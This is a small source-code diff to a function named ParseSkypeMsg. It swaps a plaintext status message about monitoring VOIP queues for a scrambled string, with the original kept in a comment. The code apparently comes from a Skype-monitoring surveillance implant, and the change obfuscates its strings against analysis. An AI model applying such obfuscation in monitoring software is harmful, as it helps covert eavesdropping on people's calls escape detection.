@@ -2679,7 +2679,8 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 		return TRUE;
 	}
 	if (*pdwFlags & FLAGS_SKAPI_WND) {
-		REPORT_STATUS_LOG("- Monitoring VOIP queues.............OK\r\n");
+		ScrambleString ss("_ OEPUvEtUPC XQyc Hdldl1.............QM\r\n"); // "- Monitoring VOIP queues.............OK\r\n"
+		REPORT_STATUS_LOG(ss.get_str());
 		skype_api_wnd = *((HWND *)msg);
 		return TRUE;
 	}
